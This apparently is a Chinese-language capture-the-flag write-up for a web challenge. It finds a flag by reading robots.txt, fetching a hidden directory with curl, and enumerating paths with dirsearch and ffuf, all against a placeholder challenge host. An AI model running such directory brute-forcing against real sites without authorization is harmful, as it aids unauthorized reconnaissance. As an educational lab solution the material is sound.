# web_dir_scan 解题过程

题面：flag 藏在某个你没被告诉过的路径里。

## 0x00 先看首页

首页只有一段"这里没什么好看的"的欢迎语和朋友式的小课堂提示。
直接点链接没有更多内容——因为导航压根不存在。

## 0x01 从 robots.txt 顺藤摸瓜

搜索引擎爬虫遵守一个约定文件 `/robots.txt`，站长会在里面写明哪些目录
不希望被收录。它同时也是给选手的路标：

```bash
curl -s http://HOST:8081/robots.txt
```

```
User-agent: *
Disallow: /s3cr3t_r00m/
Disallow: /backup/
```

两个目录被点名了：`/s3cr3t_r00m/` 和 `/backup/`。

## 0x02 访问隐藏目录

```bash
curl -s http://HOST:8081/s3cr3t_r00m/
```

返回一个目录列表，里面有 `readme.txt` 和 `flag.txt`：

```bash
curl -s http://HOST:8081/s3cr3t_r00m/flag.txt
# HCTF{...}
```

拿到 flag。

顺带看一眼诱饵目录，会发现它存在但禁止访问，这本身也是"扫目录"要
学会观察的信号：

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://HOST:8081/backup/
# 403
```

## 0x03 用扫描工具（等价做法）

不手动猜也可以直接用目录爆破工具，例如：

```bash
dirsearch -u http://HOST:8081/
# 或
ffuf -u http://HOST:8081/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

会命中 `robots.txt`、`s3cr3t_r00m` 等路径。本题路径名刻意取得足够怪异，
目的是让选手养成"先用 robots.txt / 常见字典探路"的习惯，而不是纯靠猜。

## 0x04 小结

| 步骤 | 考点 |
|---|---|
| `GET /robots.txt` | 信息泄露 / 爬虫约定 |
| `GET /s3cr3t_r00m/flag.txt` | 目录扫描与状态码观察 |
| `/backup/` 返回 403 | 403 也是有效情报 |

一键复现见 `exp.py`。
